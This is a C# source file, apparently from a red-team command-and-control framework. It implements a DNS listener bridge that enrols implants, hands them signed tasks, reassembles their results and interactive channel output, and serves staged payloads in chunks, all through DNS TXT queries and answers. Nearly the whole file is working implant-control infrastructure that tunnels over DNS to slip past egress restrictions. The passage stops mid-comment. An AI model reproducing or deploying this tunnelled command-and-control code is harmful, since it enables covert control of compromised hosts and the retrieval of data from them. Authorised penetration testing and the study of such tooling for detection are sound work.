using System.Collections.Concurrent;
using Google.Protobuf;
using Rod.Audit;
using Rod.CoreState;
using Rod.CoreState.Application;
using Rod.CoreState.Implants;
using Rod.CoreState.Live;
using Rod.CoreState.Sessions;
using Rod.CoreState.Deployment;
using Rod.CoreState.Tasks;
using Rod.CoreState.Transports;
using Rod.Transport.Endpoints;
using Rod.Transport.Payloads;
using Rod.V1;
// The domain entity shares its name with the BCL Task; this file uses the
// Rod.CoreState.Tasks types (TaskId, TaskOutcome, TaskCompleted) but never the
// entity by name, so pin Task to the BCL type the signatures need.
using Task = System.Threading.Tasks.Task;

namespace Rod.Transport.Listeners.Dns;

// The DNS contact bridge (architecture.md Sec 8): maps the datagram-shaped
// DNS contract onto the same core-state machinery the beacon stream uses --
// presence through the session registry, tasking through TaskService with the
// CA's command signature, results through the capture-and-audit composition
// the beacon endpoint performs. DNS carries no handshake and no mTLS on the
// contact path: the transport assumes the implant's session was opened on a
// handshake-capable transport and refreshes it; identity on the wire is the
// implant id alone (the egress-restricted tradeoff, documented in
// extending/implants.md). Downstream tasking stays tamper-evident regardless:
// the TaskRequest carries the same RSASSA-PSS signature over the canonical
// tuple (architecture.md Sec 9), and a DNS-delivered task verifies exactly
// like a stream-delivered one.
//
// Enrollment over DNS (Sec 8, the full-independence step for a DNS-only
// target): the enroll body -- sealed under the baked per-artifact key when
// the artifact carries one -- uploads as chunked e.-queries keyed by a
// client-chosen stream id; the terminal chunk drives the shared
// ScopedEnrollment flow scoped by the answering listener's engagement, and
// the EnrollResponse chunks back down as a.-answers under a token. An
// accepted DNS enrollment opens the session itself (no handshake exists to
// open it): the polls that follow refresh what it wrote.
//
// Sealing beyond the enroll exchange (the contact carriage's own): an
// artifact whose build baked an envelope key polls k.-named (the key id in
// the name, so the answer seals statelessly -- no in-memory pairing needs to
// survive a restart for the ciphertext to resume), its tasking and parked
// input answers ride as raw R1 bodies under DnsPollAad, and its results and
// channel outputs reassemble into sealed blobs under their own purpose tags.
// The resolver chain reads no frame bytes in the clear for a keyed artifact;
// the signature (not the seal) remains the authority on execution, so the
// documented tradeoffs -- identity by implant id, spoofable presence -- are
// unchanged, while tasking disclosure and output disclosure close.

/// <summary>
/// Serves enroll, poll, and result contacts for one teamserver. Singleton:
/// the UDP listener services (one per DNS listener entry) and the DoH route
/// share it.
/// </summary>
internal sealed class DnsBeaconBridge
{
    // The marshaled-TaskRequest budget for one DNS answer: the signed
    // TaskRequest must fit the EDNS0 response (1232 bytes) with the DNS
    // headers and the base32 expansion (5/8). A task whose arguments push it
    // over is requeued untouched -- DNS carries short-argument tasking, and
    // the queue keeps the task for a stream transport to claim.
    public const int MaxTaskRequestBytes = 560;

    // The raw-byte budget of one enroll-answer chunk: base32 of 200 bytes
    // reads as 320 answer characters, comfortably inside the EDNS0 room the
    // tasking budget leaves.
    private const int AnswerChunkBytes = 200;

    // The enrollment exchange's bounded state: in-flight uploads keyed by
    // the client-chosen stream id, and completed answers keyed by their
    // download token. Both prune oldest-first so a churning or abandoned
    // exchange cannot pin memory.
    private const int MaxEnrollStreams = 32;
    private const int MaxEnrollAnswers = 64;

    // One upload stream's byte ceiling and idle window: a legitimate
    // enrollment body is kilobytes and completes within a few query
    // rounds, so past either bound the stream is debris, not an enroll.
    private const int MaxEnrollStreamBytes = 64 * 1024;
    private static readonly TimeSpan EnrollStreamIdle = TimeSpan.FromMinutes(5);

    // The delivery ledger's bound: confirmed blobs keyed by task and sha,
    // pruned oldest-first. Generous against a fleet's in-flight reports
    // while a spoofed probe flood cannot pin memory.
    private const int MaxDeliveryAcks = 512;

    // The staged-download store's bounds (ADR-010): entries hold a reference
    // to the staged artifact's bytes (never a copy), so the count is the
    // memory surface -- a handful of concurrent degraded downloads is the
    // honest fleet's shape, and idle entries leave on the enroll window's
    // timescale so an abandoned download cannot pin one.
    private const int MaxStagedDownloads = 16;
    private static readonly TimeSpan StagedDownloadIdle = TimeSpan.FromMinutes(10);

    private readonly ISessionRegistry _sessions;
    private readonly TaskService _tasks;
    private readonly IAuditStore _audit;
    private readonly ILiveEventBus _bus;
    private readonly TimeProvider _clock;
    private readonly BeaconTasking _tasking;
    private readonly DnsContactNames.ResultReassembler _results;
    private readonly EnrollmentService _enrollment;
    private readonly Rod.CoreState.Deployment.IDeployTokenService _tokens;
    private readonly Rod.Audit.IPayloadStore _payloads;
    private readonly Rod.CoreState.Campaigns.ICampaignStore _campaigns;
    private readonly EnvelopeContactKeys _contactKeys;
    private readonly IImplantRepository _implants;
    private readonly Rod.Transport.Channels.DegradedChannelHub _degraded;
    private readonly BeaconIngest _ingest;
    private readonly DnsContactNames.ResultReassembler _channelOutputs;
    private readonly ITaskRepository _taskRecords;
    private readonly IArtifactStore _artifacts;
    private readonly object _enrollGate = new();
    private readonly Dictionary<string, EnrollUpload> _enrollUploads = new();
    private readonly Dictionary<string, byte[]> _enrollAnswers = new();
    private readonly List<string> _enrollAnswerOrder = new();

    // One enrollment upload in flight: its chunks in arrival order and the
    // last-chunk stamp the idle window and the stream cap evict by.
    private sealed class EnrollUpload
    {
        public List<byte[]> Parts = new();
        public DateTimeOffset Touched;
    }

    // The delivery ledger (the n.-probe's state): terminal reassemblies
    // that reached recording, keyed task+sha. In-memory like the enroll
    // exchange -- a restart forgets confirmations, so a live implant
    // re-sends once and re-confirms (first-wins recording tolerates it).
    private readonly object _deliveryGate = new();
    private readonly Dictionary<string, byte> _deliveryAcks = new();
    private readonly List<string> _deliveryAckOrder = new();

    // One staged download in flight (the s.-demand's token-keyed state): the
    // served artifact's bytes by reference, the seam the demand's proof
    // honored, and the seal halves when the demanding implant is key-bound --
    // each d.-probe slices and (when sealed) wraps on demand, so no copy of
    // the payload is taken and a fresh nonce seals every probe.
    private sealed class StagedDownload
    {
        public required TaskId Task { get; init; }
        public required long Start { get; init; }
        public required byte[] Content { get; init; }
        public Guid KeyId { get; init; }
        public byte[]? Key { get; init; }
        public DateTimeOffset Touched;
    }

    private readonly object _stagedGate = new();
    private readonly Dictionary<string, StagedDownload> _stagedDownloads = new();

    public DnsBeaconBridge(
        ISessionRegistry sessions,
        TaskService tasks,
        IAuditStore audit,
        ILiveEventBus bus,
        TimeProvider clock,
        BeaconTasking tasking,
        EnrollmentService enrollment,
        Rod.CoreState.Deployment.IDeployTokenService tokens,
        Rod.Audit.IPayloadStore payloads,
        Rod.CoreState.Campaigns.ICampaignStore campaigns,
        EnvelopeContactKeys contactKeys,
        IImplantRepository implants,
        Rod.Transport.Channels.DegradedChannelHub degraded,
        BeaconIngest ingest,
        ITaskRepository taskRecords,
        IArtifactStore artifacts)
    {
        _sessions = sessions;
        _tasks = tasks;
        _audit = audit;
        _bus = bus;
        _clock = clock;
        _tasking = tasking;
        _enrollment = enrollment;
        _tokens = tokens;
        _payloads = payloads;
        _campaigns = campaigns;
        _contactKeys = contactKeys;
        _implants = implants;
        _degraded = degraded;
        _ingest = ingest;
        _taskRecords = taskRecords;
        _artifacts = artifacts;
        _results = new DnsContactNames.ResultReassembler(clock);
        _channelOutputs = new DnsContactNames.ResultReassembler(clock);
    }

    /// <summary>
    /// One enrollment-upload chunk: e.&lt;stream&gt;.&lt;seq&gt;.&lt;t|m&gt;.&lt;chunk&gt;.
    /// The answer is the TXT text "+" while chunks remain, or
    /// "=&lt;base32 token&gt;" once the terminal chunk assembled -- whatever
    /// the enrollment's outcome, the client reads the full EnrollResponse
    /// under the token (a refusal names its status there); null is the
    /// malformed-shape answer (dropped, no TXT at all).
    /// </summary>
    public async Task<byte[]?> EnrollChunkAsync(
        Listener listener,
        byte[] stream,
        int sequence,
        bool terminal,
        byte[] chunk,
        CancellationToken cancellationToken)
    {
        var key = DnsContactNames.Encode(stream);
        EnrollUpload upload;
        lock (_enrollGate)
        {
            var now = _clock.GetUtcNow();
            // An upload that stopped mid-sequence leaves on idle -- a
            // dropped enrollment and spoofed debris alike, never on a
            // terminal that may never come.
            foreach (var stale in _enrollUploads
                         .Where(kv => now - kv.Value.Touched > EnrollStreamIdle)
                         .Select(kv => kv.Key)
                         .ToArray())
            {
                _enrollUploads.Remove(stale);
            }

            if (!_enrollUploads.TryGetValue(key, out var found))
            {
                // The stream cap pushes out the least recently touched
                // upload so a full map still admits the stream in hand.
                while (_enrollUploads.Count >= MaxEnrollStreams)
                {
                    var lru = _enrollUploads.Aggregate((a, b) => a.Value.Touched <= b.Value.Touched ? a : b).Key;
                    _enrollUploads.Remove(lru);
                }
                found = new EnrollUpload();
                _enrollUploads[key] = found;
            }
            upload = found;
            upload.Touched = now;
            var parts = upload.Parts;
            // In-order, or a retransmit of the last chunk (the ack it rode
            // may have been lost); anything else restarts the stream.
            if (sequence == parts.Count)
                parts.Add(chunk);
            else if (sequence != parts.Count - 1)
                return null;
            // One stream's byte ceiling: a legitimate enrollment body is
            // kilobytes, so anything past the cap is debris pinning memory.
            if (parts.Sum(p => p.Length) > MaxEnrollStreamBytes)
            {
                _enrollUploads.Remove(key);
                return null;
            }
        }

        if (!terminal)
            return System.Text.Encoding.ASCII.GetBytes("+");

        byte[] body;
        lock (_enrollGate)
        {
            if (!_enrollUploads.Remove(key, out var assembled))
                return null;
            var total = assembled.Parts.Sum(p => p.Length);
            body = new byte[total];
            var offset = 0;
            foreach (var part in assembled.Parts)
            {
                part.CopyTo(body, offset);
                offset += part.Length;
            }
        }

        // The sealed shape rides when the artifact baked a key: unwrap under
        // it before anything parses. A body naming no known key is
        // undecodable -- dropped, not negotiated.
        var sealedKeyId = Guid.Empty;
        var sealedKeyBytes = Array.Empty<byte>();
        var framed = body;
        if (EnvelopeBeaconContact.TryReadSealedKeyId(body, out var sealedText) is { } keyId)
        {
            var carrier = await _payloads.FindByEnvelopeKeyAsync(keyId, cancellationToken);
            if (carrier?.EnvelopeKey is not { } artifactKey)
                return null;
            var plain = AesGcmEnvelope.TryUnwrap(sealedText, keyId, artifactKey, AesGcmEnvelope.EnrollRequestAad);
            if (plain is null)
                return null;
            framed = plain;
            sealedKeyId = keyId;
            sealedKeyBytes = artifactKey;
        }

        Rod.V1.EnrollRequest request;
        try
        {
            var frames = EnvelopeFraming.Parse(framed);
            if (frames.Count == 0 || frames[0].Kind != FrameKind.EnrollRequest)
                return null;
            request = Rod.V1.EnrollRequest.Parser.ParseFrom(frames[0].Payload);
        }
        catch (Exception ex) when (ex is EnvelopeFramingException or InvalidProtocolBufferException)
        {
            return null;
        }

        var outcome = await ScopedEnrollment.EnrollAsync(
            new EnrollWireFields(
                request.DeployTokenSecret,
                NullWhenEmpty(request.Class),
                request.PublicKey.IsEmpty ? null : request.PublicKey.ToByteArray(),
                NullWhenEmpty(request.ParentImplantId),
                NullWhenEmpty(request.Hostname),
                NullWhenEmpty(request.Os),
                NullWhenEmpty(request.Arch),
                NullWhenEmpty(request.Username),
                NullWhenEmpty(request.KillDate),
                request.HasSleepSeconds ? request.SleepSeconds : null,
                request.HasJitterSeconds ? request.JitterSeconds : null),
            listener,
            _enrollment,
            _tokens,
            _payloads,
            _campaigns,
            _contactKeys,
            _audit,
            _clock,
            cancellationToken);

        if (outcome.Accepted)
        {
            // The accepted enrollment opens the session itself: no handshake
            // exists on this carrier to open it, and the polls that follow
            // refresh what this wrote. The advertisement is the carrier's
            // own truth -- DNS carries channels store-and-forward (input on
            // the TXT answers, output as chunked queries), so the parking
            // hub parks operator input for the polls to drain.
            var enrolled = outcome.Enrolled!;
            var implant = await _implants.FindAsync(enrolled.ImplantId, cancellationToken);
            if (implant is not null)
                await _sessions.OpenAsync(
                    implant,
                    new[] { Rod.Transport.Channels.DegradedChannelHub.Capability },
                    _clock.GetUtcNow(),
                    cancellationToken);
        }

        // The answer rides under a fresh token as one framed EnrollResponse
        // -- the frame grammar every carriage's answer speaks -- sealed when
        // the upload was: a DNS-only wire reads no frame bytes in the clear
        // either.
        var answer = EnvelopeFraming.Encode(new[]
        {
            new Frame
            {
                Kind = FrameKind.EnrollResponse,
                Payload = ByteString.CopyFrom(ScopedEnrollmentResponse.Build(outcome).ToByteArray()),
            },
        });
        if (sealedKeyId != Guid.Empty)
            answer = System.Text.Encoding.UTF8.GetBytes(AesGcmEnvelope.Wrap(
                answer, sealedKeyId, sealedKeyBytes, AesGcmEnvelope.EnrollResponseAad));
        var token = Guid.NewGuid().ToByteArray();
        lock (_enrollGate)
        {
            while (_enrollAnswers.Count >= MaxEnrollAnswers && _enrollAnswerOrder.Count > 0)
            {
                var oldestAnswer = _enrollAnswerOrder[0];
                _enrollAnswerOrder.RemoveAt(0);
                _enrollAnswers.Remove(oldestAnswer);
            }
            var tokenKey = DnsContactNames.Encode(token);
            _enrollAnswers[tokenKey] = answer;
            _enrollAnswerOrder.Add(tokenKey);
        }
        return System.Text.Encoding.ASCII.GetBytes("=" + DnsContactNames.Encode(token));
    }

    /// <summary>
    /// One enrollment-answer probe: a.&lt;token&gt;.&lt;seq&gt;. The answer
    /// is the TXT text "&lt;t|m&gt;.&lt;base32 chunk&gt;" or null when the
    /// token names no answer (expired or pruned).
    /// </summary>
    public Task<byte[]?> EnrollAnswerAsync(byte[] token, int sequence)
    {
        string part;
        lock (_enrollGate)
        {
            if (!_enrollAnswers.TryGetValue(DnsContactNames.Encode(token), out var answer))
                return Task.FromResult<byte[]?>(null);
            var from = sequence * AnswerChunkBytes;
            if (from >= answer.Length)
                return Task.FromResult<byte[]?>(null);
            var take = Math.Min(AnswerChunkBytes, answer.Length - from);
            var chunk = new byte[take];
            Array.Copy(answer, from, chunk, 0, take);
            var terminal = from + take >= answer.Length;
            part = (terminal ? "t." : "m.") + DnsContactNames.Encode(chunk);
        }
        return Task.FromResult<byte[]?>(System.Text.Encoding.ASCII.GetBytes(part));
    }

    private static string? NullWhenEmpty(string value)
        => value.Length == 0 ? null : value;

    /// <summary>
    /// One poll: refreshes the implant's presence and answers the next
    /// downstream frame -- a queued task as marshaled, signed TaskRequest
    /// bytes (kind byte 't'), or, when the queue holds nothing the carrier
    /// can serve, one parked ChannelInput frame (kind byte 'i') for a
    /// store-and-forward channel the session advertised -- or null when
    /// there is nothing to send (no live session, empty queue and empty
    /// park, a task too large for the DNS budget; the last is requeued for
    /// a stream transport). The plaintext carriage: an implant bound to an
    /// envelope key at enrollment is refused here outright (an empty answer,
    /// no presence credit) -- its tasking is never handed down in the clear,
    /// so a plain p-poll cannot downgrade a sealed artifact's channel.
    /// </summary>
    public Task<byte[]?> PollAsync(ImplantId implant, CancellationToken cancellationToken)
    {
        if (_contactKeys.TryGet(implant) is not null)
            return Task.FromResult<byte[]?>(null);
        return BuildPollPayloadAsync(implant, cancellationToken);
    }

    /// <summary>
    /// One key-named poll (the sealed carriage): the key id the name carries
    /// resolves the artifact key statelessly -- the payload store is durable,
    /// so a teamserver restart loses nothing a k-poll does not re-derive (the
    /// resolved key re-binds the in-memory pairing the p-path's refusal
    /// reads). The answer payload seals under that key (DnsPollAad): tasking
    /// and parked input alike cross the resolver chain as ciphertext. A key
    /// id that resolves to nothing (the payload was deleted) falls back to
    /// the plaintext answer -- the artifact's envelopes are undecodable by
    /// then anyway, and silence would strand an implant that can still
    /// presence.
    /// </summary>
    public async Task<byte[]?> PollAsync(ImplantId implant, Guid keyId, CancellationToken cancellationToken)
    {
        var carrier = await _payloads.FindByEnvelopeKeyAsync(keyId, cancellationToken);
        if (carrier?.EnvelopeKey is not { } key)
            return await BuildPollPayloadAsync(implant, cancellationToken);
        _contactKeys.Bind(implant, keyId, key);
        var payload = await BuildPollPayloadAsync(implant, cancellationToken);
        return payload is null
            ? null
            : AesGcmEnvelope.WrapBody(payload, keyId, key, AesGcmEnvelope.DnsPollAad);
    }

    /// <summary>
    /// The poll payload both carriages share: presence, the next claimable
    /// tasking, or the parked channel input -- the composition the poll
    /// always ran, carriage-agnostic.
    /// </summary>
    private async Task<byte[]?> BuildPollPayloadAsync(ImplantId implant, CancellationToken cancellationToken)
    {
        // DNS carries no handshake: presence only refreshes a session another
        // transport opened (or the DNS enrollment itself, which opens one).
        // An implant with no active session is not present as far as this
        // listener is concerned.
        var session = await _sessions.GetActiveAsync(implant, cancellationToken);
        if (session is null)
            return null;

        // Re-touch with the session's own capabilities: the touch replaces
        // them, and a DNS contact carries no advertisement of its own.
        await _sessions.TouchAsync(implant, session.Capabilities, _clock.GetUtcNow(), "dns", cancellationToken);

        var degraded = session.Capabilities.Contains(Rod.Transport.Channels.DegradedChannelHub.Capability);

        // The claim evaluation every poll carrier runs (architecture.md
        // Sec 10.3): DNS declares a datagram-sized budget; a channel task
        // claims under the store-and-forward discipline a degraded session
        // advertised, and a task too large for a TXT answer is requeued
        // untouched for a stream transport to claim. A requeued task joins
        // the skip set for the rest of this contact, so a task this carrier
        // cannot serve parks without standing at the queue head -- a strict
        // head-of-line claim would wedge a DNS-only implant's tasking on one
        // oversized or channel-bound task forever.
        var skipped = new HashSet<TaskId>();
        while (true)
        {
            var dispatched = await _tasks.DispatchNextAsync(implant, cancellationToken, exclude: skipped);
            if (dispatched is null)
                break;

            var marshaled = (await _tasking.BuildSignedRequestAsync(dispatched, cancellationToken)).ToByteArray();
            if (TransportCapabilities.EvaluateClaim(
                    TransportCapabilities.Dns, dispatched.Verb, marshaled.Length, MaxTaskRequestBytes, degraded)
                != ClaimDecision.Claim)
            {
                await _tasks.RequeueAsync(dispatched.TaskId, CancellationToken.None);
                skipped.Add(dispatched.TaskId);
                continue;
            }

            // The dispatch is recorded with the same shape every beacon
            // transport writes (architecture.md Sec 11): attributed to
            // the operator whose tasking it carries out, the outcome the
            // dispatched task id.
            await _tasking.RecordDispatchAsync(dispatched, cancellationToken);
            return PrependKind(TaskKindByte, marshaled);
        }

        // No task the carrier can serve: the store-and-forward half -- the
        // parked operator-input frames ride this poll's TXT answer for a
        // session that advertised the discipline, the poll carrier's answer
        // to the envelope's drain (Sec 10.3). The drain collects every
        // queued unit (a typing burst and its eof arrive together), so the
        // answer carries them all: one kind byte, then each frame
        // length-prefixed -- dropping any would strand the tail of a park
        // the drain already emptied.
        if (degraded)
        {
            await _degraded.SweepIdleAsync(cancellationToken);
            var parked = _degraded.Drain(implant, MaxTaskRequestBytes);
            if (parked.Count > 0)
                return PrependKind(InputKindByte, LengthPrefixEach(parked));
        }
        return null;
    }

    // The kind byte for a multi-frame input answer: each frame's payload
    // follows its varint length, so the client reads until the answer ends.
    private static byte[] LengthPrefixEach(IReadOnlyList<Rod.V1.Frame> frames)
    {
        var body = new System.IO.MemoryStream();
        foreach (var frame in frames)
        {
            var payload = frame.Payload.ToByteArray();
            WriteVarint(body, (ulong)payload.Length);
            body.Write(payload);
        }
        return body.ToArray();
    }

    private static void WriteVarint(System.IO.MemoryStream sink, ulong value)
    {
        while (value >= 0x80)
        {
            sink.WriteByte((byte)(value | 0x80));
            value >>= 7;
        }
        sink.WriteByte((byte)value);
    }

    // The poll answer's kind byte: the TXT payload is base32 of
    // kind || message, so one frame per answer names itself without a
    // parse-guess (a TaskRequest and a ChannelInput are both protobuf and
    // must not be told apart by trying).
    public const byte TaskKindByte = (byte)'t';
    public const byte InputKindByte = (byte)'i';

    private static byte[] PrependKind(byte kind, byte[] message)
    {
        var framed = new byte[message.Length + 1];
        framed[0] = kind;
        message.CopyTo(framed, 1);
        return framed;
    }

    /// <summary>
    /// One result chunk: reassembles (the bounded buffer in
    /// <see cref="DnsContactNames"/>); on the terminal chunk, captures the
    /// outcome into the task with the same audit and live-event composition
    /// the beacon stream performs. The implant is attributed by its id -- the
    /// DNS tradeoff -- and a result for an implant other than the task's own
    /// is dropped.
    /// </summary>
    public async Task ResultChunkAsync(
        ImplantId implant,
        TaskId task,
        Rod.CoreState.Tasks.TaskOutcome outcome,
        int sequence,
        bool terminal,
        byte[] chunk,
        CancellationToken cancellationToken)
    {
        // Presence rides the result path too.
        var session = await _sessions.GetActiveAsync(implant, cancellationToken);
        if (session is null)
            return;
        await _sessions.TouchAsync(implant, session.Capabilities, _clock.GetUtcNow(), "dns", cancellationToken);

        // The terminal chunk closes the reassembly; null means keep buffering
        // (more chunks) or drop (a gap in the sequence).
        var output = _results.Add(task, sequence, terminal, chunk);
        if (output is null)
            return;

        // The sealed carriage unseals here: a sealed blob resolves its own
        // key and must verify; a plaintext blob survives only for an implant
        // no enrollment bound to a key (the upstream half of the downgrade
        // refusal the p-path applies).
        var unsealed = await TryUnsealUplinkAsync(
            implant, output, AesGcmEnvelope.DnsResultAad.ToArray(), cancellationToken);
        if (unsealed is null)
            return;

        // The both-side half over this grammar (ADR-010): the r.-chunks carry
        // the output text alone, so a staged task's report rides its payload
        // hash on the tail -- stripped here and verified against the served
        // artifact with the same check the frame paths run.
        var report = System.Text.Encoding.UTF8.GetString(unsealed);
        var record = await _taskRecords.FindAsync(task, cancellationToken);
        if (record?.StagedBytes is not null
            && TryStripStagedHash(report, out var reported, out var stripped))
        {
            report = stripped;
            if (!await Rod.Transport.Endpoints.BeaconIngest.StagedHashMatchesAsync(
                    _artifacts, task, reported, cancellationToken))
            {
                outcome = Rod.CoreState.Tasks.TaskOutcome.Failed;
                report = $"staged payload hash mismatch: implant reported {reported}: {stripped}";
            }
        }

        TaskCompleted completed;
        try
        {
            completed = await _tasks.RecordResultAsync(task, report, outcome, cancellationToken);
        }
        catch (InvalidOperationException)
        {
            // Unknown task or a retransmitted result after completion: ignore,
            // the same tolerance the beacon stream shows. The retransmit half
            // still needs its confirmation -- first-wins already decided the
            // record, and the sender must not re-send forever -- so the
            // delivery ledger notes the blob either way.
            NoteDelivered(task, unsealed);
            return;
        }
        NoteDelivered(task, unsealed);
        if (completed.ImplantId != implant)
            return; // a result naming another implant's task: drop

        await _audit.AppendAsync(
            AuditEvent.Fact(
                eventId: Guid.NewGuid(),
                engagementId: completed.EngagementId.Value,
                operatorId: completed.IssuedBy.Value,
                implantId: completed.ImplantId.Value,
                taskId: completed.TaskId.Value,
                verb: completed.Verb,
                kind: AuditEventKind.TaskCompleted,
                payload: completed.Arguments,
                output: completed.Output,
                outcome: completed.Outcome.ToString(),
                at: completed.CompletedAt),
            cancellationToken);
        await _bus.PublishAsync(
            LiveEvent.TaskCompleted(
                completed.EngagementId,
                completed.IssuedBy,
                completed.ImplantId,
                completed.TaskId,
                payload: $"{completed.Outcome}: {completed.Output}",
                completed.CompletedAt),
            cancellationToken);
    }

    /// <summary>
    /// One channel-output chunk (architecture.md Sec 10.3, the
    /// store-and-forward carriage over DNS): reassembles the marshaled
    /// ChannelOutput message (the bounded buffer); on the terminal chunk,
    /// ingests it through the shared composition the beacon stream uses --
    /// the transcript append, the relay delivery, the live fan-out. A
    /// re-sent complete sequence (a cycle whose queries were lost after the
    /// reassembly landed) re-assembles and re-ingests: the append is the
    /// transcript's own record, and a duplicate chunk after the channel's
    /// final result is the straggler the ingest path already ignores.
    /// </summary>
    public async Task ChannelChunkAsync(
        ImplantId implant,
        TaskId task,
        int sequence,
        bool terminal,
        byte[] chunk,
        CancellationToken cancellationToken)
    {
        var traceSession = await _sessions.GetActiveAsync(implant, cancellationToken);
        // Presence rides the channel-output path too.
        var session = traceSession;
        if (session is null)
            return;
        await _sessions.TouchAsync(implant, session.Capabilities, _clock.GetUtcNow(), "dns", cancellationToken);

        var message = _channelOutputs.Add(task, sequence, terminal, chunk);
        if (message is null)
            return;

        // The sealed carriage unseals here, the result path's own rule under
        // the channel's purpose tag.
        var data = await TryUnsealUplinkAsync(
            implant, message, AesGcmEnvelope.DnsChannelAad.ToArray(), cancellationToken);
        if (data is null)
            return;

        // The reassembled bytes are the channel's DATA (the name carries the
        // task id), so the message is built here rather than parsed -- the
        // client chunks the data field, not a marshaled message.
        var output = new Rod.V1.ChannelOutput
        {
            TaskId = task.ToString(),
            Data = Google.Protobuf.ByteString.CopyFrom(data),
        };
        var context = new BeaconSessionContext(
            implant,
            session.EngagementId,
            session.Id,
            new OperatorId(session.ImplantId.Value),
            session.Capabilities);
        await _ingest.OpenConnection().IngestAsync(
            context,
            new Rod.V1.Frame { Kind = Rod.V1.FrameKind.ChannelOutput, Payload = Google.Protobuf.ByteString.CopyFrom(output.ToByteArray()) },
            stagedPullSink: static _ => { },
            taskAckSink: static _ => { },
            cancellationToken);
        // The channel's own delivery note: the ingest composition has no
        // completion record to read, so the ledger is the confirmation a
        // re-sending sender probes.
        NoteDelivered(task, data);
    }

    /// <summary>
    /// One staged-payload demand (ADR-010):
    /// s.&lt;task&gt;.&lt;offset&gt;.&lt;proof&gt;.&lt;implant&gt;.
    /// Presence rides the demand like every contact path; the task must be
    /// the implant's own and hold staged bytes. The honored seam runs the
    /// same prefix-proof validation the frame carriages run
    /// (<see cref="BeaconTasking.ResolveResumeStart"/>), and the answer is
    /// "=<b32 token>" naming a chunked download of the remainder -- sealed
    /// per chunk for a key-bound implant, so the resolver chain reads no
    /// payload bytes in the clear. Null (no TXT answer) for a demand this
    /// listener cannot serve: the implant's idle guard owns that failure.
    /// </summary>
    public async Task<byte[]?> StagedDemandAsync(
        ImplantId implant,
        TaskId task,
        long offset,
        byte[]? prefixSha,
        CancellationToken cancellationToken)
    {
        var session = await _sessions.GetActiveAsync(implant, cancellationToken);
        if (session is null)
            return null;
        await _sessions.TouchAsync(implant, session.Capabilities, _clock.GetUtcNow(), "dns", cancellationToken);

        var record = await _taskRecords.FindAsync(task, cancellationToken);
        if (record is null || record.StagedBytes is null || record.ImplantId != implant)
            return null;

        var staged = (await _artifacts.ForTaskAsync(task.Value, cancellationToken))
            .FirstOrDefault(a => a.Name == StagedArtifacts.NameFor(task.Value));
        var content = staged?.Content ?? Array.Empty<byte>();
        var start = BeaconTasking.ResolveResumeStart(content, (ulong)offset, prefixSha);

        var bound = _contactKeys.TryGet(implant);
        var token = Guid.NewGuid().ToByteArray();
        lock (_stagedGate)
        {
            var now = _clock.GetUtcNow();
            foreach (var stale in _stagedDownloads
                         .Where(kv => now - kv.Value.Touched > StagedDownloadIdle)
                         .Select(kv => kv.Key)
                         .ToArray())
            {
                _stagedDownloads.Remove(stale);
            }
            while (_stagedDownloads.Count >= MaxStagedDownloads)
            {
                var lru = _stagedDownloads.Aggregate((a, b) => a.Value.Touched <= b.Value.Touched ? a : b).Key;
                _stagedDownloads.Remove(lru);
            }
            _stagedDownloads[DnsContactNames.Encode(token)] = new StagedDownload
            {
                Task = task,
                Start = start,
                Content = content,
                KeyId = bound?.KeyId ?? Guid.Empty,
                Key = bound?.Key,
                Touched = now,
            };
        }
        return System.Text.Encoding.ASCII.GetBytes("=" + DnsContactNames.Encode(token));
    }

    /// <summary>
    /// One staged-download chunk probe: d.&lt;token&gt;.&lt;seq&gt;, answered
    /// "&lt;t|m&gt;.&lt;b32 chunk&gt;" -- the answer-sized slice at the seam
    /// the demand honored, sealed per chunk under the staged tag for a
    /// key-bound implant. A task whose staged bytes are gone answers its
    /// first probe with the empty terminal chunk, the frame path's own
    /// resolution shape. Null when the token names no download (expired,
    /// evicted, or never issued): the client re-demands on its next cycle.
    /// </summary>
    public Task<byte[]?> StagedDownloadAsync(byte[] token, int sequence)
    {
        string part;
        lock (_stagedGate)
        {
            if (!_stagedDownloads.TryGetValue(DnsContactNames.Encode(token), out var download))
                return Task.FromResult<byte[]?>(null);
            download.Touched = _clock.GetUtcNow();
            if (download.Content.Length == 0 && sequence == 0)
            {
                part = "t." + DnsContactNames.Encode(Array.Empty<byte>());
            }
            else
            {
                var from = checked(download.Start + (long)sequence * AnswerChunkBytes);
                if (from >= download.Content.Length)
                    return Task.FromResult<byte[]?>(null);
                var take = Math.Min(AnswerChunkBytes, download.Content.Length - from);
                var slice = new byte[take];
                Array.Copy(download.Content, from, slice, 0, take);
                var terminal = from + take >= download.Content.Length;
                if (download.Key is { } key)
                    slice = AesGcmEnvelope.WrapBody(slice, download.KeyId, key, AesGcmEnvelope.DnsStagedAad);
                part = (terminal ? "t." : "m.") + DnsContactNames.Encode(slice);
            }
        }
        return Task.FromResult<byte[]?>(System.Text.Encoding.ASCII.GetBytes(part));
    }

    // Strips the staged report's tail token ("\nsha256:<64 hex>", the
    // grammar this carriage carries the both-side hash on); false when the
    // text carries no well-formed token.
    private static bool TryStripStagedHash(string report, out string hash, out string stripped)
    {
        const string marker = "\nsha256:";
        hash = string.Empty;
        stripped = report;
        var at = report.LastIndexOf(marker, StringComparison.Ordinal);
        if (at < 0)
            return false;
        var hex = report[(at + marker.Length)..];
        if (hex.Length != 64 || hex.Any(c => !Uri.IsHexDigit(c)))
            return false;
        hash = hex.ToLowerInvariant();
        stripped = report[..at];
        return true;
    }

    /// <summary>
    /// One delivery probe (n.&lt;task&gt;.&lt;sha&gt;.&lt;implant&gt;): true when
    /// that exact blob's reassembly reached recording -- the confirmation
    /// that lets the sender stop re-sending.
    /// </summary>
    public bool DeliveryConfirmed(TaskId task, byte[] sha)
    {
        lock (_deliveryGate)
        {
            return _deliveryAcks.ContainsKey(DeliveryKey(task, sha));
        }
    }

    // Notes one delivered blob in the bounded ledger, oldest-first pruned.
    private void NoteDelivered(TaskId task, byte[] plaintext)
    {
        var key = DeliveryKey(task, DnsContactNames.DeliverySha(plaintext));
        lock (_deliveryGate)
        {
            if (_deliveryAcks.ContainsKey(key))
                return;
            while (_deliveryAcks.Count >= MaxDeliveryAcks && _deliveryAckOrder.Count > 0)
            {
                var oldest = _deliveryAckOrder[0];
                _deliveryAckOrder.RemoveAt(0);
                _deliveryAcks.Remove(oldest);
            }
            _deliveryAcks[key] = 1;
            _deliveryAckOrder.Add(key);
        }
    }

    private static string DeliveryKey(TaskId task, byte[] sha)
        => task.ToString() + ":" + Convert.ToHexString(sha);

    /// <summary>
    /// The upstream unseal both reassembly paths share: a sealed blob (the
    /// raw R1 shape) resolves its own key off the payload store and must
    /// verify under the path's purpose tag, or the whole reassembly drops;
